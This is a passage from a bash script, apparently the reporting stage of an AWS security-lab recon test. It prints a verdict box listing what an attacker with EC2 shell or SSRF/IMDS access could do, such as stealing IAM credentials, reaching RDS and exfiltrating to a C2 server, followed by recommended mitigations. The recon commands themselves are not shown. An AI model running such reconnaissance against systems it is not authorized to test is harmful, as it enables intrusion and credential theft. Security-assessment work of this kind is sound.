result_text+="Reachable hosts: ${REACHABLE_HOSTS}"$'\n'
result_text+="Exposed secrets: ${EXPOSED_SECRETS}"$'\n'

if [[ "${SSH_AVAILABLE}" == "true" ]]; then
    echo -e "${RED}║                                                                   ║${NC}"
    echo -e "${RED}║  [CRITICAL] Full shell access established via SSH                 ║${NC}"
    echo -e "${RED}║                                                                   ║${NC}"
    echo -e "${RED}║  When attacker obtains EC2 shell access:                          ║${NC}"
    echo -e "${RED}║    - Can fully understand network configuration                   ║${NC}"
    echo -e "${RED}║    - Can directly access RDS in Private Subnet                    ║${NC}"
    echo -e "${RED}║    - Can collect secrets from local files                          ║${NC}"
    echo -e "${RED}║    - Can communicate with external C2 server and exfiltrate data  ║${NC}"
    echo -e "${RED}║    - Can explore and attack hosts in other subnets                ║${NC}"
    echo -e "${RED}║                                                                   ║${NC}"
    echo -e "${RED}║  In Config A, SSH is exposed externally, so risk of               ║${NC}"
    echo -e "${RED}║  shell access via brute-force or key leakage is high              ║${NC}"
    echo -e "${RED}║                                                                   ║${NC}"
    result_text+="Verdict: CRITICAL — Full shell access possible via SSH"$'\n'
else
    echo -e "${YELLOW}║                                                                   ║${NC}"
    echo -e "${YELLOW}║  [HIGH] Limited internal recon possible via SSRF/IMDS             ║${NC}"
    echo -e "${YELLOW}║                                                                   ║${NC}"
    echo -e "${YELLOW}║  Config B prevents direct SSH connection, so:                     ║${NC}"
    echo -e "${YELLOW}║    - Cannot obtain shell access                                   ║${NC}"
    echo -e "${YELLOW}║    - Cannot explore filesystem                                    ║${NC}"
    echo -e "${YELLOW}║    - Cannot perform subnet scanning                               ║${NC}"
    echo -e "${YELLOW}║                                                                   ║${NC}"
    echo -e "${YELLOW}║  However:                                                         ║${NC}"
    echo -e "${YELLOW}║    - Network info is retrievable via IMDS                         ║${NC}"
    echo -e "${YELLOW}║    - IAM credentials can still be stolen                          ║${NC}"
    echo -e "${YELLOW}║    - If SSM access is configured, shell-equivalent ops possible   ║${NC}"
    echo -e "${YELLOW}║                                                                   ║${NC}"
    result_text+="Verdict: HIGH — Limited recon via SSRF/IMDS (no shell access)"$'\n'
fi

echo -e "${BOLD}╠═══════════════════════════════════════════════════════════════════╣${NC}"
echo -e "${BOLD}║  Recommended mitigations:                                        ║${NC}"
echo -e "${BOLD}║                                                                   ║${NC}"

if [[ "${CONFIG_MODE}" == "public" ]]; then
    echo -e "${BOLD}║  Config A specific:                                              ║${NC}"
    echo -e "${BOLD}║    1. Strictly restrict SSH source IPs (maintain current my_ip)  ║${NC}"
    echo -e "${BOLD}║    2. Regularly rotate SSH keys                                  ║${NC}"
    echo -e "${BOLD}║    3. Change SSH port from 22 (obfuscation, not a real fix)      ║${NC}"
    echo -e "${BOLD}║    4. Use SSM in production and close SSH port                   ║${NC}"
fi

echo -e "${BOLD}║  Common:                                                         ║${NC}"
echo -e "${BOLD}║    1. Enforce IMDSv2                                             ║${NC}"
echo -e "${BOLD}║    2. Minimize EC2 IAM role permissions                          ║${NC}"
echo -e "${BOLD}║    3. Restrict RDS SG to EC2 SG only (already implemented)       ║${NC}"
echo -e "${BOLD}║    4. Do not put secrets in user data (use Secrets Manager)       ║${NC}"
echo -e "${BOLD}║    5. Monitor abnormal internal traffic with VPC flow logs        ║${NC}"
echo -e "${BOLD}║    6. Deploy EDR/host-based IDS on EC2                           ║${NC}"
echo -e "${BOLD}╚═══════════════════════════════════════════════════════════════════╝${NC}"

echo ""

# ---------------------------------------------------------------------------
# Save results
# ---------------------------------------------------------------------------
save_result "${RESULT_FILE}" "${result_text}"

log "Internal recon complete — ${TOTAL_FINDINGS} findings, ${REACHABLE_HOSTS} reachable hosts, ${EXPOSED_SECRETS} exposed secrets"
